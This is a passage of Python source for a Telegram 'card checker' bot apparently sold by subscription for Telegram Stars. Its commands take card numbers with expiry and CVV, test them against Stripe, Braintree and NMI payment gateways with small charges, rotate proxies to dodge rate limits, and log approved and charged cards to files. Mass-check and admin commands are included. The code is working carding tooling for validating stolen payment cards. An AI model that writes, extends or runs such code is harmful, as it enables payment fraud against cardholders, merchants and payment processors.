                return "ERROR", "Rate Limit", brand
            if "security code is" in msg.lower():
                return "DECLINED", msg, brand
            if "requires_action" in msg.lower() or "require_action" in msg.lower():
                return "3DS", "Authentication Required", brand
            if "card was declined" in msg.lower() or "card number is incorrect" in msg.lower() or "security code is invalid" in msg.lower():
                return "DECLINED", msg, brand
            return "DECLINED", msg, brand
        except Exception:
            continue
    return "ERROR", "Gateway Rate Limited", "UNKNOWN"

# ============================================================
# نظام الاشتراك بنجوم تلغرام (Telegram Stars)
# ============================================================

SUB_PLANS = {
    "sub_1day":   {"title": "𝐈𝐬𝐡𝐭𝐢𝐫𝐚𝐤 𝐘𝐚𝐰𝐦 𝐖𝐚𝐡𝐢𝐝", "days": 1,  "stars": 100,  "desc": "𝟏 𝐘𝐚𝐰𝐦"},
    "sub_7days":  {"title": "𝐈𝐬𝐡𝐭𝐢𝐫𝐚𝐤 𝐔𝐬𝐛𝐮𝐞",       "days": 7,  "stars": 500,  "desc": "𝟕 𝐀𝐲𝐚𝐦"},
    "sub_15days": {"title": "𝐈𝐬𝐡𝐭𝐢𝐫𝐚𝐤 𝟏𝟓 𝐘𝐚𝐰𝐦",      "days": 15, "stars": 700,  "desc": "𝟏𝟓 𝐘𝐚𝐰𝐦"},
    "sub_30days": {"title": "𝐈𝐬𝐡𝐭𝐢𝐫𝐚𝐤 𝐒𝐡𝐚𝐡𝐫",       "days": 30, "stars": 1000, "desc": "𝟑𝟎 𝐘𝐚𝐰𝐦"},
}

SUB_MENU_TEXT = (
    "𝐊𝐡𝐮𝐭𝐭𝐚𝐭 𝐀𝐥𝐒𝐮𝐛𝐬𝐜𝐫𝐢𝐛𝐞\n"
    "_____________________________\n"
    "𝟏  𝐘𝐚𝐰𝐦   𝐍𝐚𝐣𝐦𝐚 𝟏𝟎𝟎\n"
    "𝟕  𝐀𝐲𝐚𝐦   𝐍𝐚𝐣𝐦𝐚 𝟓𝟎𝟎\n"
    "𝟏𝟓 𝐘𝐚𝐰𝐦   𝐍𝐚𝐣𝐦𝐚 𝟕𝟎𝟎\n"
    "𝟑𝟎 𝐘𝐚𝐰𝐦   𝐍𝐚𝐣𝐦𝐚 𝟏𝟎𝟎𝟎\n"
    "_____________________________\n"
    "𝐈𝐤𝐡𝐭𝐚𝐫 𝐦𝐢𝐧 𝐚𝐥𝐀𝐬𝐟𝐚𝐥"
)

def build_sub_keyboard():
    mk = telebot.types.InlineKeyboardMarkup(row_width=1)
    mk.add(
        telebot.types.InlineKeyboardButton("𝟏  𝐘𝐚𝐰𝐦  𝟏𝟎𝟎", callback_data="sub_1day"),
        telebot.types.InlineKeyboardButton("𝟕  𝐀𝐲𝐚𝐦  𝟓𝟎𝟎", callback_data="sub_7days"),
        telebot.types.InlineKeyboardButton("𝟏𝟓 𝐘𝐚𝐰𝐦  𝟕𝟎𝟎", callback_data="sub_15days"),
        telebot.types.InlineKeyboardButton("𝟑𝟎 𝐘𝐚𝐰𝐦  𝟏𝟎𝟎𝟎", callback_data="sub_30days"),
    )
    return mk

def add_premium_days(user_id, days):
    exp = time.time() + (days * 86400)
    existing = []
    try:
        with open(PREMIUM_FILE, 'r') as f:
            existing = f.readlines()
    except:
        existing = []
    with open(PREMIUM_FILE, 'w') as f:
        for line in existing:
            if str(user_id) not in line:
                f.write(line)
        f.write(f"{user_id}|{exp}\n")

@bot.message_handler(commands=['subscribe'])
def subscribe_command(message):
    user_id = message.from_user.id
    if is_banned(user_id):
        bot.reply_to(message, "<b>You are banned!</b>", parse_mode="HTML")
        return
    add_user(user_id)
    try:
        bot.send_animation(
            message.chat.id,
            START_ANIMATION_URL,
            caption=SUB_MENU_TEXT,
            parse_mode="HTML",
            reply_markup=build_sub_keyboard(),
        )
    except Exception as e:
        print(f"[SUBSCRIBE] animation failed: {e}")
        bot.send_message(
            message.chat.id,
            SUB_MENU_TEXT,
            parse_mode="HTML",
            reply_markup=build_sub_keyboard(),
        )

@bot.callback_query_handler(func=lambda c: c.data in SUB_PLANS)
def cb_sub_plan(call):
    plan_key = call.data
    plan = SUB_PLANS[plan_key]
    try:
        bot.answer_callback_query(call.id)
    except:
        pass
    try:
        bot.send_invoice(
            chat_id=call.message.chat.id,
            title=plan["title"],
            description=f"𝐈𝐬𝐡𝐭𝐢𝐫𝐚𝐤 𝐥𝐢𝐦𝐮𝐝𝐝𝐚𝐭 {plan['desc']}",
            invoice_payload=plan_key,
            provider_token="",
            currency="XTR",
            prices=[telebot.types.LabeledPrice(label=plan["title"], amount=plan["stars"])],
        )
    except Exception as e:
        bot.send_message(call.message.chat.id, f"<b>Error</b>: {str(e)[:100]}", parse_mode="HTML")

@bot.pre_checkout_query_handler(func=lambda q: True)
def precheckout_handler(pre_checkout_query):
    if pre_checkout_query.invoice_payload in SUB_PLANS:
        try:
            bot.answer_pre_checkout_query(pre_checkout_query.id, ok=True)
        except Exception as e:
            print(f"[PRECHECKOUT] failed: {e}")
    else:
        try:
            bot.answer_pre_checkout_query(
                pre_checkout_query.id,
                ok=False,
                error_message="𝐇𝐚𝐝𝐡𝐚 𝐚𝐥𝐤𝐡𝐢𝐲𝐚𝐫 𝐠𝐡𝐚𝐲𝐫 𝐦𝐚𝐰𝐣𝐮𝐝"
            )
        except:
            pass

@bot.message_handler(content_types=['successful_payment'])
def successful_payment_handler(message):
    payment = message.successful_payment
    user_id = message.from_user.id
    payload = payment.invoice_payload
    plan = SUB_PLANS.get(payload)
    if not plan:
        return
    add_premium_days(user_id, plan["days"])
    try:
        s = get_stats()
        s["premium_users"] = s.get("premium_users", 0) + 1
        save_stats(s)
    except:
        pass
    exp_date = datetime.datetime.fromtimestamp(time.time() + plan["days"] * 86400).strftime("%Y-%m-%d")
    bot.send_message(
        message.chat.id,
        "𝐓𝐚𝐦𝐚𝐦𝐚𝐭 𝐚𝐥𝐃𝐚𝐟𝐚𝐚 𝐛𝐢𝐧𝐚𝐣𝐚𝐡\n"
        "_____________________________\n"
        f"𝐀𝐥𝐤𝐡𝐮𝐭𝐭𝐚 : {plan['title']}\n"
        f"𝐀𝐥𝐦𝐮𝐝𝐝𝐚 : {plan['desc']}\n"
        f"𝐀𝐥𝐧𝐚𝐣𝐦𝐚𝐭 : {payment.total_amount}\n"
        f"𝐘𝐚𝐧𝐭𝐚𝐡𝐢 𝐟𝐢 : {exp_date}\n"
        "_____________________________\n"
        "𝐓𝐚𝐦𝐦𝐚 𝐭𝐚𝐟𝟑𝐢𝐥 𝐚𝐥𝐢𝐬𝐡𝐭𝐢𝐫𝐚𝐤 𝐭𝐢𝐥𝐪𝐚𝟐𝐢𝐲𝐚𝐧.",
        parse_mode="HTML"
    )
    try:
        bot.send_message(
            ADMIN_ID,
            "𝐍𝐞𝐰 𝐒𝐮𝐛𝐬𝐜𝐫𝐢𝐩𝐭𝐢𝐨𝐧\n"
            f"𝐔𝐬𝐞𝐫 : {user_id}\n"
            f"𝐏𝐥𝐚𝐧 : {plan['title']}\n"
            f"𝐒𝐭𝐚𝐫𝐬 : {payment.total_amount}",
            parse_mode="HTML"
        )
    except:
        pass

# ============ HANDLERS ============
@bot.message_handler(commands=['setnmicart'])
def set_nmi_cart(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, bold("Admin only"), parse_mode="HTML")
        return
    try:
        parts = message.text.split()
        if len(parts) < 3:
            bot.reply_to(message, bold("Usage:") + " /setnmicart <cartId> <checkoutId>", parse_mode="HTML")
            return
        save_nmi_cart(parts[1], parts[2])
        bot.reply_to(message, f"{bold('NMI Cart saved')}:\n{bold('Cart')}: {parts[1]}\n{bold('Checkout')}: {parts[2]}", parse_mode="HTML")
    except:
        bot.reply_to(message, bold("Usage:") + " /setnmicart <cartId> <checkoutId>", parse_mode="HTML")

@bot.message_handler(commands=['nmicart'])
def show_nmi_cart(message):
    cart, chk = load_nmi_cart()
    bot.reply_to(message, f"{bold('NMI Cart')}:\n{HLINE*20}\n{bold('Cart')}: {cart}\n{bold('Checkout')}: {chk}\n{bold('Amount')}: {NMI_AMOUNT} {NMI_CURRENCY}", parse_mode="HTML")

@bot.message_handler(commands=['proxy'])
def proxy_command(message):
    user_id = message.from_user.id
    if is_banned(user_id):
        bot.reply_to(message, bold("You are banned!"), parse_mode="HTML")
        return
    add_user(user_id)
    is_owner = is_admin(user_id)
    text = message.text.strip()
    parts = text.split(maxsplit=1)

    if len(parts) < 2:
        cmds_text = (
            f"{bold('Proxy Commands')}\n"
            f"{HLINE*20}\n"
            f"/proxy add <proxy>  \u2794  {bold('Add proxies')}\n"
            f"/proxy list        \u2794  {bold('List proxies')}\n"
            f"/proxy test        \u2794  {bold('Test proxies')}\n"
            f"/proxy remove <i>  \u2794  {bold('Remove proxy')}"
        )
        if not is_owner:
            cmds_text = (
                f"{bold('Proxy Commands')}\n"
                f"{HLINE*20}\n"
                f"/proxy list        \u2794  {bold('List proxies')}\n"
                f"/proxy test        \u2794  {bold('Test proxies')}"
            )
        bot.reply_to(message, cmds_text, parse_mode="HTML")
        return

    cmd = parts[1].split()[0].lower()
    arg = parts[1][len(cmd):].strip()

    if cmd == 'add' and not is_owner:
        bot.reply_to(message, bold("Only owner can add proxies."), parse_mode="HTML")
        return

    if cmd == 'add':
        proxies_to_add = []
        if arg:
            proxies_to_add = [l.strip() for l in arg.splitlines() if l.strip()]
        elif message.reply_to_message:
            rep = message.reply_to_message
            raw = rep.text or rep.caption or ''
            proxies_to_add = [l.strip() for l in raw.splitlines() if l.strip()]
        if not proxies_to_add:
            bot.reply_to(message, bold("Usage:") + " /proxy add <proxy>", parse_mode="HTML")
            return
        msg = bot.reply_to(message, f"{bold('Testing')} {len(proxies_to_add)} {bold('proxies')}...", parse_mode="HTML")
        res = test_proxies_bulk(proxies_to_add)
        working = res["working"]
        invalid = len(res["invalid"])
        dead = len(res["dead"])
        existing = []
        if os.path.exists(PROXY_FILE):
            with open(PROXY_FILE, 'r') as f:
                existing = [l.strip() for l in f if l.strip()]
        existing_set = set(existing)
        new_working = [p for p in working if p not in existing_set]
        skipped = len(working) - len(new_working)
        final_list = list(dict.fromkeys(existing + working))
        save_proxies(final_list)
        result = (f"{bold('Proxy Add Result')}\n{'='*20}\n"
                  f"{bold('Total')}: {len(proxies_to_add)}\n{bold('Working')}: {len(working)}\n"
                  f"{bold('Duplicate')}: {skipped}\n{bold('Invalid')}: {invalid}\n{bold('Dead')}: {dead}")
        try:
            bot.edit_message_text(result, message.chat.id, msg.message_id, parse_mode="HTML")
        except:
            bot.reply_to(message, result, parse_mode="HTML")
    elif cmd == 'list':
        with open(PROXY_FILE, 'r') as f:
            proxies = [l.strip() for l in f if l.strip()]
        if not proxies:
            bot.reply_to(message, bold("No proxies found"), parse_mode="HTML")
            return
        lines = [f"{bold('Proxies')} ({len(proxies)})"]
        for i, p in enumerate(proxies, 1):
            masked = p[:20] + '...' if len(p) > 23 else p
            lines.append(f"{i}. {masked}")
        bot.reply_to(message, "\n".join(lines), parse_mode="HTML")
    elif cmd == 'remove':
        if not is_owner:
            bot.reply_to(message, bold("Only owner can remove proxies."), parse_mode="HTML")
            return
        if not arg:
            bot.reply_to(message, bold("Usage:") + " /proxy remove <index/all>", parse_mode="HTML")
            return
        with open(PROXY_FILE, 'r') as f:
            proxies = [l.strip() for l in f if l.strip()]
        if arg == 'all':
            save_proxies([])
            bot.reply_to(message, bold("All proxies removed"), parse_mode="HTML")
            return
        try:
            idx = int(arg)
            removed = proxies.pop(idx - 1)
            save_proxies(proxies)
            bot.reply_to(message, f"{bold('Removed')}: {removed}", parse_mode="HTML")
        except:
            bot.reply_to(message, bold("Usage:") + " /proxy remove <index/all>", parse_mode="HTML")
    elif cmd == 'test':
        with open(PROXY_FILE, 'r') as f:
            proxies = [l.strip() for l in f if l.strip()]
        msg = bot.reply_to(message, f"{bold('Testing')} {len(proxies)} {bold('proxies')}...", parse_mode="HTML")
        res = test_proxies_bulk(proxies)
        working = res["working"]
        dead = len(res["dead"])
        save_proxies(working)
        result = (f"{bold('Proxy Test Result')}\n{'='*20}\n"
                  f"{bold('Tested')}: {len(proxies)}\n{bold('Working')}: {len(working)}\n{bold('Dead')}: {dead}")
        try:
            bot.edit_message_text(result, message.chat.id, msg.message_id, parse_mode="HTML")
        except:
            bot.reply_to(message, result, parse_mode="HTML")

# ============ قائمة الأزرار الرئيسية ============
def build_main_keyboard():
    mk = telebot.types.InlineKeyboardMarkup(row_width=2)
    mk.row(
        telebot.types.InlineKeyboardButton("𝐆𝐀𝐓𝐄", callback_data="menu_gate"),
        telebot.types.InlineKeyboardButton("𝐒𝐮𝐛𝐬𝐜𝐫𝐢𝐛𝐞", callback_data="menu_sub"),
    )
    mk.row(
        telebot.types.InlineKeyboardButton("𝐁𝐚𝐰𝐰𝐚𝐛𝐚𝐭", callback_data="menu_gates"),
        telebot.types.InlineKeyboardButton("𝐅𝐔𝐑𝐘", callback_data="menu_fury"),
    )
    return mk

def build_gates_keyboard():
    mk = telebot.types.InlineKeyboardMarkup(row_width=1)
    mk.add(
        telebot.types.InlineKeyboardButton("𝐒𝐭𝐫𝐢𝐩𝐞 𝐀𝐮𝐭𝐡", callback_data="gate_stripe"),
        telebot.types.InlineKeyboardButton("𝐁𝐫𝐚𝐢𝐧𝐭𝐫𝐞𝐞 𝐂𝐡𝐚𝐫𝐠𝐞 𝟑.𝟎𝟓$", callback_data="gate_bt"),
        telebot.types.InlineKeyboardButton("𝐍𝐌𝐈 𝐂𝐡𝐚𝐫𝐠𝐞 𝟏.𝟏𝟑$", callback_data="gate_nmi"),
        telebot.types.InlineKeyboardButton("𝐁𝐚𝐜𝐤", callback_data="menu_back"),
    )
    return mk

# ============ معالج الأزرار ============
@bot.callback_query_handler(func=lambda c: c.data.startswith("menu_") or c.data.startswith("gate_"))
def cb_menu(call):
    try:
        bot.answer_callback_query(call.id)
    except:
        pass
    data = call.data
    chat_id = call.message.chat.id

    if data == "menu_gates" or data == "menu_gate":
        try:
            bot.delete_message(chat_id, call.message.message_id)
        except:
            pass
        text = (
            "𝐁𝐚𝐰𝐰𝐚𝐛𝐚𝐭\n"
            "_____________________________\n"
            "𝐒𝐭𝐫𝐢𝐩𝐞 𝐀𝐮𝐭𝐡\n"
            "𝐁𝐫𝐚𝐢𝐧𝐭𝐫𝐞𝐞 𝐂𝐡𝐚𝐫𝐠𝐞 𝟑.𝟎𝟓$\n"
            "𝐍𝐌𝐈 𝐂𝐡𝐚𝐫𝐠𝐞 𝟏.𝟏𝟑$\n"
            "_____________________________\n"
            "𝐈𝐤𝐡𝐭𝐚𝐫 𝐦𝐢𝐧 𝐚𝐥𝐀𝐬𝐟𝐚𝐥"
        )
        bot.send_animation(chat_id, START_ANIMATION_URL, caption=text, parse_mode="HTML", reply_markup=build_gates_keyboard())
        return

    if data == "menu_sub":
        try:
            bot.delete_message(chat_id, call.message.message_id)
        except:
            pass
        bot.send_animation(chat_id, START_ANIMATION_URL, caption=SUB_MENU_TEXT, parse_mode="HTML", reply_markup=build_sub_keyboard())
        return

    if data == "menu_fury":
        try:
            bot.delete_message(chat_id, call.message.message_id)
        except:
            pass
        text = (
            "𝐅𝐔𝐑𝐘\n"
            "_____________________________\n"
            "𝐀𝐥𝐦𝐮𝐭𝐚𝐰𝐢𝐫 : @FUYRM1\n"
            "_____________________________\n"
            "𝐈𝐤𝐡𝐭𝐚𝐫 𝐦𝐢𝐧 𝐚𝐥𝐀𝐬𝐟𝐚𝐥"
        )
        bot.send_animation(chat_id, START_ANIMATION_URL, caption=text, parse_mode="HTML", reply_markup=build_main_keyboard())
        return

    if data == "menu_back":
        try:
            bot.delete_message(chat_id, call.message.message_id)
        except:
            pass
        user = call.from_user
        fname = user.first_name or "User"
        text = build_start_text(user.id, fname)
        bot.send_animation(chat_id, START_ANIMATION_URL, caption=text, parse_mode="HTML", reply_markup=build_main_keyboard())
        return

    if data == "gate_stripe":
        try:
            bot.delete_message(chat_id, call.message.message_id)
        except:
            pass
        text = (
            "𝐒𝐭𝐫𝐢𝐩𝐞 𝐀𝐮𝐭𝐡\n"
            "_____________________________\n"
            "/st  𝐅𝐚𝐡𝐬 𝐅𝐚𝐫𝐝𝐢\n"
            "/mst 𝐅𝐚𝐡𝐬 𝐉𝐚𝐦𝐚𝐞𝐢\n"
            "_____________________________\n"
            "𝐈𝐤𝐡𝐭𝐚𝐫 𝐦𝐢𝐧 𝐚𝐥𝐀𝐬𝐟𝐚𝐥"
        )
        bot.send_animation(chat_id, START_ANIMATION_URL, caption=text, parse_mode="HTML", reply_markup=build_gates_keyboard())
        return

    if data == "gate_bt":
        try:
            bot.delete_message(chat_id, call.message.message_id)
        except:
            pass
        text = (
            "𝐁𝐫𝐚𝐢𝐧𝐭𝐫𝐞𝐞 𝐂𝐡𝐚𝐫𝐠𝐞 𝟑.𝟎𝟓$\n"
            "_____________________________\n"
            "/bc  𝐅𝐚𝐡𝐬 𝐅𝐚𝐫𝐝𝐢\n"
            "/mbc 𝐅𝐚𝐡𝐬 𝐉𝐚𝐦𝐚𝐞𝐢\n"
            "_____________________________\n"
            "𝐈𝐤𝐡𝐭𝐚𝐫 𝐦𝐢𝐧 𝐚𝐥𝐀𝐬𝐟𝐚𝐥"
        )
        bot.send_animation(chat_id, START_ANIMATION_URL, caption=text, parse_mode="HTML", reply_markup=build_gates_keyboard())
        return

    if data == "gate_nmi":
        try:
            bot.delete_message(chat_id, call.message.message_id)
        except:
            pass
        text = (
            "𝐍𝐌𝐈 𝐂𝐡𝐚𝐫𝐠𝐞 𝟏.𝟏𝟑$\n"
            "_____________________________\n"
            "/nmi  𝐅𝐚𝐡𝐬 𝐅𝐚𝐫𝐝𝐢\n"
            "/mnmi 𝐅𝐚𝐡𝐬 𝐉𝐚𝐦𝐚𝐞𝐢\n"
            "_____________________________\n"
            "𝐈𝐤𝐡𝐭𝐚𝐫 𝐦𝐢𝐧 𝐚𝐥𝐀𝐬𝐟𝐚𝐥"
        )
        bot.send_animation(chat_id, START_ANIMATION_URL, caption=text, parse_mode="HTML", reply_markup=build_gates_keyboard())
        return

# ============ نص رسالة /start ============
def build_start_text(user_id, fname):
    greet = f"𝐅𝐔𝐑𝐘 𝐁𝐎𝐓\n𝐖𝐞𝐥𝐜𝐨𝐦𝐞, {fname}!"
    user_cmds = f"""𝐔𝐒𝐄𝐑
{HLINE*15}
/st  \u2794 𝐒𝐭𝐫𝐢𝐩𝐞 𝐀𝐮𝐭𝐡
/mst \u2794 𝐒𝐭𝐫𝐢𝐩𝐞 𝐀𝐮𝐭𝐡 𝐌𝐚𝐬𝐬
/bc  \u2794 𝐁𝐫𝐚𝐢𝐧𝐭𝐫𝐞𝐞 𝐂𝐡𝐚𝐫𝐠𝐞 $𝟑.𝟎𝟓
/mbc \u2794 𝐁𝐫𝐚𝐢𝐧𝐭𝐫𝐞𝐞 𝐂𝐡𝐚𝐫𝐠𝐞 𝐌𝐚𝐬𝐬
/nmi \u2794 𝐍𝐌𝐈 𝐂𝐡𝐚𝐫𝐠𝐞 £𝟏
/mnmi \u2794 𝐍𝐌𝐈 𝐂𝐡𝐚𝐫𝐠𝐞 𝐌𝐚𝐬𝐬
/proxy \u2794 𝐏𝐫𝐨𝐱𝐢𝐞𝐬
/subscribe \u2794 𝐒𝐮𝐛𝐬𝐜𝐫𝐢𝐛𝐞
/info \u2794 𝐈𝐧𝐟𝐨"""
    admin_cmds = f"""𝐀𝐃𝐌𝐈𝐍
{HLINE*15}
/setbttoken \u2794 𝐁𝐓 𝐓𝐨𝐤𝐞𝐧
/btinfo \u2794 𝐁𝐓 𝐒𝐭𝐚𝐭𝐮𝐬
/setnmicart \u2794 𝐍𝐌𝐈 𝐂𝐚𝐫𝐭
/nmicart \u2794 𝐒𝐡𝐨𝐰 𝐍𝐌𝐈
/addpremium \u2794 𝐀𝐝𝐝 𝐏𝐫𝐞𝐦
/rmpremium \u2794 𝐑𝐦 𝐏𝐫𝐞𝐦
/ban \u2794 𝐁𝐚𝐧
/unban \u2794 𝐔𝐧𝐛𝐚𝐧
/stats \u2794 𝐒𝐭𝐚𝐭𝐬"""
    footer = f"\n{HLINE*15}\n𝐃𝐞𝐯 : @FUYRM1"
    if is_admin(user_id):
        return f"{greet}\n\n{user_cmds}\n\n{admin_cmds}\n{footer}"
    return f"{greet}\n\n{user_cmds}\n{footer}"

@bot.message_handler(commands=['start'])
def start(message):
    user_id = message.from_user.id
    if is_banned(user_id):
        bot.reply_to(message, bold("You are banned!"), parse_mode="HTML")
        return
    add_user(user_id)
    fname = message.from_user.first_name
    menu = build_start_text(user_id, fname)

    try:
        bot.send_animation(message.chat.id, START_ANIMATION_URL, caption=menu, parse_mode="HTML",
                           reply_markup=build_main_keyboard())
    except Exception as e:
        print(f"[START] animation failed: {e}")
        try:
            bot.send_animation(message.chat.id, START_ANIMATION_URL)
        except:
            pass
        try:
            bot.send_message(message.chat.id, menu, parse_mode="HTML", reply_markup=build_main_keyboard())
        except:
            pass

@bot.message_handler(commands=['st'])
def b3(message):
    user_id = message.from_user.id
    if is_banned(user_id):
        bot.reply_to(message, bold("You are banned!"), parse_mode="HTML")
        return
    add_user(user_id)
    if ACTIVE_USERS_PP.get(user_id):
        bot.reply_to(message, bold("Already running") + " /st", parse_mode="HTML")
        return
    allowed, used, limit, reset_in = consume_check(user_id)
    if not allowed:
        bot.reply_to(message, check_limit_message(used, limit, reset_in), parse_mode="HTML")
        return
    if not proxy_list:
        bot.reply_to(message, bold("Please add proxy first"), parse_mode="HTML")
        return
    cc = None
    if len(message.text.split()) > 1:
        cc = message.text.split()[1].split('#')[0].strip()
    elif message.reply_to_message:
        target_text = message.reply_to_message.text or message.reply_to_message.caption or ""
        match = re.search(r'(\d{15,16})[|](\d{2})[|](\d{2,4})[|](\d{3,4})', target_text)
        if match:
            cc = f"{match.group(1)}|{match.group(2)}|{match.group(3)}|{match.group(4)}"
    if not cc:
        bot.reply_to(message, bold("Format") + ": /st 4111...|12|25|123", parse_mode="HTML")
        return
    ACTIVE_USERS_PP[user_id] = True
    msg = bot.reply_to(message, f"{bold('Processing Stripe Auth')}... [{used}/{limit}]", parse_mode="HTML")
    t_start = time.time()
    brand_bin, bank, country, level, type_cc, flag = get_bin_info(cc[:6])
    status, response, brand_auto = "ERROR", "No response", "UNKNOWN"
    for _ in range(MAX_RETRIES):
        proxy_dict = None; p_raw = None
        proxy_dict, p_raw = get_proxy_dict()
        try:
            status, response, brand_auto = check_cc(cc, proxy_dict)
            if status != "ERROR":
                break
        finally:
            release_proxy(p_raw)
    elapsed = str(round(time.time() - t_start, 2))
    brand = brand_bin if brand_bin != "UNKNOWN" else brand_auto.title()
    if status == "APPROVED":
        s = get_stats(); s["approved"] += 1; save_stats(s)
        with open(APPROVED_FILE, 'a', encoding="utf-8") as f: f.write(f"{cc} - {response}\n")
    elif status == "3DS":
        s = get_stats(); s["3ds"] += 1; save_stats(s)
        with open(THREEDS_FILE, 'a', encoding="utf-8") as f: f.write(f"{cc} - {response}\n")
    res = build_template("Stripe Auth", "sa", status, response, brand, bank, country, level, type_cc, flag, elapsed, cc_full=cc)
    if limit > 0:
        res += f"\n\n\U0001f4ca {bold('Daily')}: {used}/{limit}"
    try: bot.delete_message(message.chat.id, msg.message_id)
    except: pass
    try: bot.reply_to(message, res, parse_mode="HTML")
    except:
        try: bot.reply_to(message, res.replace("<a href", "LINK <a href"), parse_mode="HTML")
        except: pass
    time.sleep(CARD_DELAY)
    ACTIVE_USERS_PP[user_id] = False

@bot.message_handler(commands=['bc'])
def bc_single(message):
    user_id = message.from_user.id
    if is_banned(user_id):
        bot.reply_to(message, bold("You are banned!"), parse_mode="HTML")
        return
    add_user(user_id)
    if ACTIVE_USERS_BT.get(user_id):
        bot.reply_to(message, bold("Already running") + " /bc", parse_mode="HTML")
        return
    allowed, used, limit, reset_in = consume_check(user_id)
    if not allowed:
        bot.reply_to(message, check_limit_message(used, limit, reset_in), parse_mode="HTML")
        return
    if not load_bt_token():
        bot.reply_to(message, bold("Braintree token not set. Use") + " /setbttoken", parse_mode="HTML")
        return
    if not proxy_list:
        bot.reply_to(message, bold("Please add proxy first with") + " /proxy add", parse_mode="HTML")
        return
    cc = None
    if len(message.text.split()) > 1:
        cc = message.text.split()[1].split('#')[0].strip()
    elif message.reply_to_message:
        t = message.reply_to_message.text or message.reply_to_message.caption or ""
        m = re.search(r'(\d{15,16})[|](\d{2})[|](\d{2,4})[|](\d{3,4})', t)
        if m:
            cc = f"{m.group(1)}|{m.group(2)}|{m.group(3)}|{m.group(4)}"
    if not cc:
        bot.reply_to(message, bold("Format") + ": /bc 4111...|12|25|123", parse_mode="HTML")
        return
    ACTIVE_USERS_BT[user_id] = True
    msg = bot.reply_to(message, f"{bold('Processing Braintree Charge')} $3.05... [{used}/{limit}]", parse_mode="HTML")
    t_start = time.time()
    brand_bin, bank, country, level, type_cc, flag = get_bin_info(cc[:6])
    status, response, brand_auto = "ERROR", "No response", "UNKNOWN"
    for _ in range(MAX_RETRIES):
        proxy_dict = None; p_raw = None
        proxy_dict, p_raw = get_proxy_dict()
        try:
            status, response, brand_auto = check_cc_braintree(cc, proxy_dict)
            if status != "ERROR": break
        finally:
            release_proxy(p_raw)
        time.sleep(2)
    elapsed = str(round(time.time() - t_start, 2))
    brand = brand_bin if brand_bin != "UNKNOWN" else str(brand_auto).title()
    if status == "CHARGED":
        s = get_stats(); s["bt_charged"] = s.get("bt_charged", 0) + 1; save_stats(s)
        with open(BT_APPROVED, 'a', encoding="utf-8") as f:
            f.write(f"{cc} - CHARGED - {response}\n")
    elif status == "3DS":
        s = get_stats(); s["bt_3ds"] = s.get("bt_3ds", 0) + 1; save_stats(s)
        with open(BT_3DS, 'a', encoding="utf-8") as f:
            f.write(f"{cc} - 3DS - {response}\n")
    res = build_template("Braintree Charge", "bc", status, response, brand, bank, country, level, type_cc, flag, elapsed, cc_full=cc)
    if limit > 0:
        res += f"\n\n\U0001f4ca {bold('Daily')}: {used}/{limit}"
    try: bot.delete_message(message.chat.id, msg.message_id)
    except: pass
    try: bot.reply_to(message, res, parse_mode="HTML")
    except:
        try: bot.reply_to(message, res.replace("<a href", "LINK <a href"), parse_mode="HTML")
        except: pass
    time.sleep(CARD_DELAY)
    ACTIVE_USERS_BT[user_id] = False

@bot.message_handler(commands=['nmi'])
def nmi_single(message):
    user_id = message.from_user.id
    if is_banned(user_id):
        bot.reply_to(message, bold("You are banned!"), parse_mode="HTML")
        return
    add_user(user_id)
    if ACTIVE_USERS_NMI.get(user_id):
        bot.reply_to(message, bold("Already running") + " /nmi", parse_mode="HTML")
        return
    allowed, used, limit, reset_in = consume_check(user_id)
    if not allowed:
        bot.reply_to(message, check_limit_message(used, limit, reset_in), parse_mode="HTML")
        return
    if not proxy_list:
        bot.reply_to(message, bold("Please add proxy first with") + " /proxy add", parse_mode="HTML")
        return
    cc = None
    if len(message.text.split()) > 1:
        cc = message.text.split()[1].split('#')[0].strip()
    elif message.reply_to_message:
        t = message.reply_to_message.text or message.reply_to_message.caption or ""
        m = re.search(r'(\d{15,16})[|](\d{2})[|](\d{2,4})[|](\d{3,4})', t)
        if m:
            cc = f"{m.group(1)}|{m.group(2)}|{m.group(3)}|{m.group(4)}"
    if not cc:
        bot.reply_to(message, bold("Format") + ": /nmi 4111...|12|25|123", parse_mode="HTML")
        return
    ACTIVE_USERS_NMI[user_id] = True
    msg = bot.reply_to(message, f"{bold('Processing NMI Charge')} \u00a3{NMI_AMOUNT}... [{used}/{limit}]", parse_mode="HTML")
    t_start = time.time()
    brand_bin, bank, country, level, type_cc, flag = get_bin_info(cc[:6])
    status, response, brand_auto = "ERROR", "No response", "UNKNOWN"
    for _ in range(MAX_RETRIES):
        proxy_dict = None; p_raw = None
        proxy_dict, p_raw = get_proxy_dict()
        try:
            status, response, brand_auto = check_cc_nmi(cc, proxy_dict)
            if status != "ERROR": break
        finally:
            release_proxy(p_raw)
        time.sleep(2)
    elapsed = str(round(time.time() - t_start, 2))
    brand = brand_bin if brand_bin != "UNKNOWN" else str(brand_auto).title()
    if status == "CHARGED":
        s = get_stats(); s["nmi_charged"] = s.get("nmi_charged", 0) + 1; save_stats(s)
        with open(NMI_APPROVED, 'a', encoding="utf-8") as f:
            f.write(f"{cc} - CHARGED - {response}\n")
    elif status == "DECLINED":
        s = get_stats(); s["nmi_declined"] = s.get("nmi_declined", 0) + 1; save_stats(s)
        with open(NMI_DECLINED, 'a', encoding="utf-8") as f:
            f.write(f"{cc} - DECLINED - {response}\n")
    elif status == "3DS":
        with open(NMI_3DS, 'a', encoding="utf-8") as f:
            f.write(f"{cc} - 3DS - {response}\n")
    res = build_template("NMI Charge", "nmi", status, response, brand, bank, country, level, type_cc, flag, elapsed, cc_full=cc)
    if limit > 0:
        res += f"\n\n\U0001f4ca {bold('Daily')}: {used}/{limit}"
    try: bot.delete_message(message.chat.id, msg.message_id)
    except: pass
    try: bot.reply_to(message, res, parse_mode="HTML")
    except:
        try: bot.reply_to(message, res.replace("<a href", "LINK <a href"), parse_mode="HTML")
        except: pass
    time.sleep(CARD_DELAY)
    ACTIVE_USERS_NMI[user_id] = False

@bot.message_handler(commands=['mst'])
def mb3(message):
    user_id = message.from_user.id
    if is_banned(user_id):
        bot.reply_to(message, bold("You are banned!"), parse_mode="HTML")
        return
    add_user(user_id)
    if not is_admin(user_id):
        bot.reply_to(message, bold("Only owner can use Mass checks."), parse_mode="HTML")
        return
    if ACTIVE_USERS_MPP.get(user_id):
        bot.reply_to(message, bold("Already running") + " /mst", parse_mode="HTML")
        return
    if not proxy_list:
        bot.reply_to(message, bold("Please add proxy first"), parse_mode="HTML")
        return
    if not message.reply_to_message or not message.reply_to_message.document:
